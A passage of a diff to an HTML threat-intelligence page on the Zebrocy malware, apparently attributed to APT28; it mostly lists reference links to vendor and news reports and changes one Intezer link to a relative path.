 containing a benign PDF and a malicious executable. &lt;a href="https://www.welivesecurity.com/2019/05/22/journey-zebrocy-land/"target="_blank" rel="noopener"&gt;[8]&lt;/a&gt;&lt;a href="https://www.justice.gov/opa/page/file/1098481/download"target="_blank" rel="noopener"&gt;[10]&lt;/a&gt;&lt;a href="https://www.justice.gov/file/1080281/download"target="_blank" rel="noopener"&gt;[11]&lt;/a&gt;&lt;/li&gt;
@@ -1666,7 +1671,7 @@ for analyzing memory dumps.&lt;/li&gt;
 &lt;li&gt;&lt;a href="https://www.cnbc.com/2014/10/28/russian-hackers-target-nato-military-secrets.html"target="_blank" rel="noopener"&gt;CNBC, Russian Hackers Target NATO, Military Secrets&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href="https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-apt28.pdf"target="_blank" rel="noopener"&gt;FireEye, APT28: A Window Into Russia&amp;rsquo;s Cyber Espionage Operations?&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href="https://securelist.com/greyenergys-overlap-with-zebrocy/89506/"target="_blank" rel="noopener"&gt;Kaspersky, GreyEnergy&amp;rsquo;s Overlap with Zebrocy&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="https://intezer.com/blog/research/russian-apt-uses-covid-19-lures-to-deliver-zebrocy/"target="_blank" rel="noopener"&gt;Intezer, A Zebra in Gopher&amp;rsquo;s Clothing: Russian APT Uses COVID-19 Lures to Deliver Zebrocy&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="../../../2020/12/russian-apt-uses-covid-19-lures-to-deliver-zebrocy/"&gt;Intezer, A Zebra in Gopher&amp;rsquo;s Clothing: Russian APT Uses COVID-19 Lures to Deliver Zebrocy&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href="https://quointelligence.eu/2020/09/apt28-zebrocy-malware-campaign-nato-theme/"target="_blank" rel="noopener"&gt;Quointelligence, APT28 Delivers Zebrocy Malware Campaign using NATO Theme as Lure&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href="https://www.welivesecurity.com/2018/04/24/sednit-update-analysis-zebrocy/"target="_blank" rel="noopener"&gt;ESET, Sednit Update: Analysis of Zebrocy&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href="https://vk-intel.org/2019/01/22/lets-learn-progression-of-apt28-autoit-zebrocy-downloaders-source-code-level-analysis/"target="_blank" rel="noopener"&gt;VK-Intel. Let&amp;rsquo;s Learn: Progression of APT28 AutoIt Zebrocy Downloaders: Source-Code Level Analysis&lt;/a&gt;&lt;/li&gt;
